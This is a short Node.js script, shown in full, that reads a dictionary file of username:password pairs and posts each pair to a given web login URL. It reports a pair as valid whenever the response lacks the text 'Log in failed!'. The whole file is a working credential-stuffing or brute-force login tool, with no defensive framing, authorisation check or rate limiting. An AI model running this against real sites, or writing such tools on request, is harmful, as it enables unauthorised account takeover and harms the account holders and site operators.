//Dependencies
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Functions
function try_login(username, password){
    Request.post(Self_Args[0], {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `command=login&username=${username}&password=${password}`
    },function(err, res, body){
        if(err){
            console.log(`${username}:${password} is invalid.`)
            return
        }

        if(body.indexOf("Log in failed!") == -1){
            console.log(`${username}:${password} is valid.`)
        }else{
            console.log(`${username}:${password} is invalid.`)
        }
    })
}

//Main
if(!Self_Args.length){
    console.log("node index.js <login_link> <dictionary>")
    process.exit()
}

if(!Self_Args[0] || Self_Args[0].indexOf("http") == -1 || Self_Args[0].indexOf("://") == -1){
    console.log("Invalid login_link.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[1])){
    console.log("Invalid dictionary.")
    process.exit()
}

const file_data_eachline = Fs.readFileSync(Self_Args[1], "utf8").split("\n")

if(!file_data_eachline){
    console.log("Dictionary data is empty.")
    process.exit()
}

for( i in file_data_eachline ){
    try_login(file_data_eachline[i].split(":")[0].replace(/\r/g, ""), file_data_eachline[i].split(":")[1].replace(/\r/g, ""))
}
